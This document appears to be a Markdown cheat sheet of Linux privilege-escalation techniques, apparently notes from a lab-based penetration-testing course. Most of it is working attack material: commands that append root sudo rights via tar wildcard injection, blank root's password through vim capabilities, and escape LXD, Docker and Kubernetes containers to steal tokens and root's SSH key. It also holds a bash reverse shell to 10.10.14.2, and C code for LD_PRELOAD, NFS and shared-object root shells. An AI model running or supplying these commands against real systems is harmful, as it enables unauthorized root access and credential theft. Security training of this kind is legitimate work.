# Content 
- [Environment-based Privilege Escalation](#environment-based-privilege-escalation)
    - [Path Abuse](#path-abuse)
    - [Wildcard Abuse](#wildcard-abuse)
    - [Escaping Restricted Shells](#escaping-restricted-shells)
- [Permissions-based Privilege Escalation](#permissions-based-privilege-escalation)
    - [Special Permissions](#special-permissions)
    - [Sudo Rights Abuse](#sudo-rights-abuse)
    - [Privileged Groups](#privileged-groups)
    - [Capabilities](#capabilities)
- [Service-based Privilege Escalation](#service-based-privilege-escalation)
    - [Vulnerable Services](#vulnerable-services)
    - [Cron Job Abuse](#cron-job-abuse)
    - [Containers](#containers)
        - [Linux Containers](#linux-containers)
        - [Docker](#docker)
        - [Kubernetes](#kubernetes)
    - [Logrotate](#logrotate)
    - [Miscellaneous Techniques](#miscellaneous-techniques)
        - [Passive Traffic Capture](#passive-traffic-capture)
        - [Weak NFS Privileges](#weak-nfs-privileges)
        - [Hijacking Tmux Sessions](#hijacking-tmux-sessions)
- [Linux Internals-based Privilege Escalation](#linux-internals-based-privilege-escalation)
    - [Kernel Exploits](#kernel-exploits)
    - [Shared Libraries](#shared-libraries)
    	- [LD_PRELOAD Privilege Escalation](#ld_preload-privilege-escalation)
     	- [Shared Object Hijacking](#shared-object-hijacking)
    - [Python Library Hijacking](#python-library-hijacking)


check [gtfobins](https://gtfobins.github.io/)

# Environment-based Privilege Escalation

## Path Abuse
we could replace a common binary such as ls with a malicious script such as a reverse shell.

```shell
$ PATH=.:${PATH}
$ export PATH
$ echo $PATH
```

## Wildcard Abuse
- [Linux-PrivEsc-Wildcard](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)
- [wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

| Character | Significance                                                   |
|-----------|----------------------------------------------------------------|
| *         | An asterisk that can match any number of characters in a file name. |
| ?         | Matches a single character.                                    |
| [ ]       | Brackets enclose characters and can match any single one at the defined position. |
| ~         | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
| -         | A hyphen within brackets will denote a range of characters.   |


### EX: privilege escalation in tar

- cron job
```shell
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
- By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options.
```
$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
$ echo "" > "--checkpoint-action=exec=sh root.sh"
$ echo "" > --checkpoint=1

```

- check the dir , now when the job executed it will run our script  
```shell
$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

## Escaping Restricted Shells
- [escape restricted shells](https://0xffsec.com/handbook/shells/restricted-shells/)


# Permissions-based Privilege Escalation

## Special Permissions
- check [gtfobins](https://gtfobins.github.io/#+suid)
```shell
# find binaries with setuid set
# It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. 
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# find binaries with setgid set
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
## Sudo Rights Abuse

- [gtfobins](https://gtfobins.github.io/#+sudo)

```shell
sudo -l 
```

AppArmor in more recent distributions has predefined the commands used with the postrotate-command, effectively preventing command execution. Two best practices that should always be considered when provisioning sudo rights:

1. Always specify the absolute path to any binaries listed in the sudoers file entry. Otherwise, an attacker may be able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be executed when the command runs (i.e., if the sudoers entry specifies cat instead of /bin/cat this could likely be abused).

2. Grant sudo rights sparingly and based on the principle of least privilege. Does the user need full sudo rights? Can they still perform their job with one or two entries in the sudoers file? Limiting the privileged command that a user can run will greatly reduce the likelihood of successful privilege escalation.

## Privileged Groups

### 1) LXC / LXD
all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root

### 2) Docker
- Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. 
- One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume.
- Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. 

### 3) Disk
- Users within the disk group have full access to any devices contained within /dev, such as `/dev/sda1`, which is typically the main device used by the operating system.
- An attacker with these privileges can use debugfs to access the entire file system with root level privileges. this could be leveraged to retrieve SSH keys, credentials or to add a user.

### 4) ADM
- Members of the adm group are able to read all logs stored in `/var/log`.
- This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.


## Capabilities 

Linux capabilities can be used to escalate a user's privileges to root check for more [exploit linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

| Capability       | Description                                                                                                                                           |
|------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| cap_setuid       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.                  |
| cap_setgid       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.                            |
| cap_sys_admin    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems. |
| cap_dac_override | Allows bypassing of file read, write, and execute permission checks.                                                                                   |

options

| Capability Values | Description  |
|-------------------|-----------------------------------------------------------------------------------------------------------------------------------|
| =                 | This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. |
| +ep               | This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. |
| +ei               | This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
| +p                | This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. |


### Enumerating Capabilities

```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

### Exploitation Capabilities

```shell
# check vim
$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip

# We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
/usr/bin/vim.basic /etc/passwd

# or
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.
```

# Service-based Privilege Escalation

## Vulnerable Services

check for avaialble services and binaries versions to see if there is available exploits 

#### EX: 
Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

## Cron Job Abuse
- search for editable cron jobs
- even if the crontabe is only editable by the root user. You may find a world-writable script that is used in it and run as root 
- you can monitor the process using [pspy](https://github.com/DominicBreuker/pspy) without sudo privliage to know when the crontabe executed 
```shell
# Cron
find /etc -type d -name '*cron*' -exec sh -c 'echo "Parent Directory: $1"; ls -lah "$1"' sh {} \;

# find writable files or directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# monitor every seconed 
pspy64 -pf -i 1000
```

## Containers
### Linux Containers
- We can either create our own container and transfer it to the target system or use an existing container. 
- we must be in either the lxc or lxd group
- check [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
```shell
id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```
use an existing template
```shell
$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```
- After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container.
- This flag disables all isolation features that allow us to act on the host.
```shell
$ lxc init ubuntutemp privesc -c security.privileged=true
$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
$ lxc start privesc
$ lxc exec privesc /bin/bash

# to access the contents of the root directory on the host type cd /mnt/root/root

```
### Docker 
check [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

#### Mounted Docker Socket privesc
suppose we are on a docker container and we want to break out to the system and get root access 
```shell
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
install [docker](https://master.dockerproject.org/linux/x86_64/docker)
```shell
/tmp$ wget https://<parrot-os>:443/docker -O docker
/tmp$ chmod +x docker
/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
```
We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container
```shell
# we must use the same image we are on it
/tmp$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem.
/tmp$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

```

#### Docker host system privesc
- user we are logged in with must be in the docker group.
- Docker may have SUID set, or we are in the Sudoers file, which permits us to run docker as root.
```shell
id

docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

```shell
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Kubernetes


| Service             | TCP Ports       |
|---------------------|-----------------|
| etcd                | 2379, 2380      |
| API server          | 6443            |
| Scheduler           | 10251           |
| Controller Manager  | 10252           |
| Kubelet API         | 10250           |
| Read-Only Kubelet API | 10255         |



#### **Extracting Pods**
- **Kubelet API**
```shell
$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
```

- **Kubeletctl**
```shell
$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

#### Available Commands

- **Kubeletctl**
  
```shell
$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

#### Executing Commands

- **Kubeletctl**

```shell
$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```
current user executing the id command inside the container has root privileges. which could potentially lead to privilege escalation vulnerabilities. 


If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.

#### Extracting Tokens

```shell
$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

#### Extracting Certificates

```shell
$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

Now that we have both the token and certificate, we can check the access rights in the Kubernetes cluster.

we can inquire of K8s whether we have permission to perform different actions on various resources.

#### List Privileges
```
$ export token=`cat k8.token`
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list


Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											    []					[]				[get create list]
```

we can get, create, and list pods which are the resources representing the running container in the cluster. 

From here on, we can create a YAML file that we can use to create a new container and mount the entire root filesystem from the host system into this container's /root directory. From there on, we could access the host systems files and directories.

#### Pod YAML

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

#### Creating a new Pod
```shell
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

#### Extracting Root's SSH Key
```shell
$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
```

## Logrotate 
1. we need write permissions on the log files
```shell
# find writable files or directories
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```
3. logrotate must run as a privileged user or root
```shell
ls -l $(which logrotate)

-rwxr-xr-x 1 root root 107712 Nov  6  2022 /usr/sbin/logrotate
```
4. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0
```shell
logrotate -v
```

here is the exploit [logrotten](https://github.com/whotwagner/logrotten)

- We can download and compile it on a similar kernel of the target system and then transfer it to the target system.
- or if we can compile the code on the target system.
```shell
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```
payload
```shell
$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```
before running the exploit, we need to determine which option logrotate uses in logrotate.conf.

```shell
$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

```shell
# If "create"-option is set in logrotate.cfg:
./logrotten -p ./payloadfile /tmp/log/pwnme.log

# If "compress"-option is set in logrotate.cfg:
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log

```
we need to trigger the log file to rotate
```shell
logrotate -f /tmp/pwnme.log

# edit /var/lib/logrotate.status to a date in the future. This tricks logrotate into thinking that the rotation hasn't occurred yet today

# edit the log file  to add anything in it
```

## Miscellaneous Techniques
### Passive Traffic Capture
- If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. 
- Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. 

### Weak NFS Privileges

in the attacker machine
```shell
# lists the NFS server's export list
showmount -e 10.129.2.12
```
in the victim machine 
```
cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

| Option         | Description                                                                                                                                                                   |
|----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| root_squash    | If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set. |
| no_root_squash | Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|


```
$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}


/tmp$ gcc shell.c -o shell
```

```shell
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```

```shell
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```

### Hijacking Tmux Sessions
if a session was created like this 
```
$ tmux -S /shareds new -s debugsess
$ chown root:devs /shareds
```
if we are in the dev group, we can attach to this session and gain root access.
```shell
$ ps aux | grep tmux

$ id

$ tmux -S /shareds
```

# Linux Internals-based Privilege Escalation

## Kernel Exploits
check for the kernal version for cve
```shell
uname -a

cat /etc/lsb-release

searchsploit Linux Kernel 4.15.0

searchsploit Ubuntu 18.04
```
## Shared Libraries
**there are two types of libraries exist in Linux:** 
- static libraries (denoted by the `.a` file extension) 
- dynamically linked shared object libraries (denoted by the `.so` file extension).


**When a program is compiled:**  
- static libraries become part of the program and can not be altered. 
- dynamic libraries can be modified to control the execution of the program that calls them.

**ways to specify the location of dynamic libraries:**

- `-rpath` or -`rpath-link` flags: These flags are used during compilation to specify additional directories to search for dynamic libraries.
- Environmental variables:
    - `LD_RUN_PATH`: Similar to `-rpath`, but set as an environment variable. It affects the search path at runtime.
    - `LD_LIBRARY_PATH` : This variable is used to specify additional directories to search for shared libraries at runtime. It overrides the default search path.
- Default directories: By default, the system looks in /lib and /usr/lib directories for shared libraries.
- `/etc/ld.so.conf` configuration file: This file contains a list of directories to search for shared libraries.
- Directories listed in the application’s `RUNPATH` value
```shell
readelf -d <binary>  | grep PATH
```


The shared objects required by a binary can be viewed using the ldd utility.

```shell
$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

### LD_PRELOAD Privilege Escalation

check the sudo
```
sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```
make a dynamic library
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

```

```
$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```
set the LD_PRELOAD var to the malcious library /tmp/root.so
```
$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

**another example**
```shell
$ sudo -l
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: /usr/bin/openssl
```


```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

```

```
$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

```shell
$ sudo LD_PRELOAD=/tmp/root.so openssl
```
### Shared Object Hijacking

Consider the following SETUID binary
```shell
$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

check used libraries 
```shell
$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

directories in RUNPATH variable are given preference over other directories.
```shell
$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
check the directory if it is writable
```shell
ls -la /development/
```
we need to find the function name called by the binary.
```shell
# copy any other library to the directory or compile a program
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
gcc hello.c -fPIC -shared -o /development/libshared.so

./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```
write a library
```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```

```shell
$ gcc src.c -fPIC -shared -o /development/libshared.so
```
## Python Library Hijacking

**here are three basic vulnerabilities where hijacking can be used:**
- Wrong write permissions
- Library Path
- PYTHONPATH environment variable

### Wrong write permissions

```shell
# check script have setuid 
$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

```
Python Script - Contents
```python
!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```
Module Permissions
```shell
$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

change the module by edtiting virtual_memory function 

### Library Path

**To be able to use this variant, two prerequisites are necessary:**
- We must have write permissions to one of the paths having a higher priority on the list.
- The module that is imported by the script is located under one of the lower priority paths listed via the PYTHONPATH variable.



paths higher on the list take priority over ones lower on the list.
```shell
$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

$ pip3 show psutil

Location: /usr/local/lib/python3.8/dist-packages
```
Misconfigured Directory Permissions
```shell
$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```

cretae Hijacked Module Contents in psutil.py in /usr/lib/python3.8
```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

```

### PYTHONPATH Environment Variable

we are allowed to run /usr/bin/python3 under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the `SETENV`
```shell
sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

create a malcious script int `/tmp` and run
```shell
$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
